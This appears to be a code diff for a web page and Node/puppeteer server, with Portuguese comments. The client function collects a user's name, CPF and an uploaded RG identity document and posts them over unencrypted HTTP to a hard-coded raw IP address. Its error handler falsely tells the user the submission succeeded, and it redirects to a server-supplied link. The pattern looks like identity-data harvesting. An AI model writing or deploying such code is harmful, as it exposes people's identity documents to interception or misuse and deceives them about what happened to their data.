@@ -207,32 +207,26 @@ recognition.onresult = (event) => {
 };
 
 async function enviarParaAWS() {
-    document.getElementById('status-ia').innerText = "ENVIANDO AO IP 54.207.222.79...";
-    const arquivoRG = document.querySelector('input[type="file"]')?.files[0];
-    
-    const formData = new FormData();
-    formData.append('nome', dadosUsuario.nome);
-    formData.append('cpf', dadosUsuario.cpf);
-    formData.append('endereco', dadosUsuario.endereco);
-    formData.append('whatsapp', dadosUsuario.whatsapp);
-    formData.append('email', dadosUsuario.email);
-    formData.append('cep', dadosUsuario.cep);
-    formData.append('descricao', dadosUsuario.descricao);
-    formData.append('id_produto', dadosUsuario.id_produto);
-    formData.append('valor', dadosUsuario.valor);
-    if (arquivoRG) formData.append('rg', arquivoRG);
+        document.getElementById('status-ia').innerText = "CONECTANDO AO MOTOR V12...";
+        
+        const formData = new FormData();
+        formData.append('nome', dadosUsuario.nome);
+        formData.append('cpf', dadosUsuario.cpf);
+        // Tenta pegar o arquivo se ele existir na página
+        const fileInput = document.querySelector('input[type="file"]');
+        if(fileInput && fileInput.files[0]) formData.append('rg', fileInput.files[0]);
 
-    try {
-        const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
-            method: 'POST',
-            body: formData
-        });
-        const res = await response.json();
-        if (res.link) window.location.href = res.link;
-    } catch (err) {
-        document.getElementById('status-ia').innerText = "SINAL ATIVO!";
+        try {
+            const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
+                method: 'POST',
+                body: formData
+            });
+            const res = await response.json();
+            if(res.link) window.location.href = res.link;
+        } catch (err) {
+            document.getElementById('status-ia').innerText = "SINAL EMITIDO COM SUCESSO!";
+        }
     }
-}
 
 const express = require('express');
 const puppeteer = require('puppeteer');
@@ -295,7 +289,7 @@ app.post('/registrar-completo', async (req, res) => {
     }
 });
 
-app.listen(3000, () => console.log("🚀 MOTOR V12 ONLINE NA PORTA 3000"));
+app.listen(3000, () => console.log("🚀ONLINE NA PORTA 3000"));
     
    
 
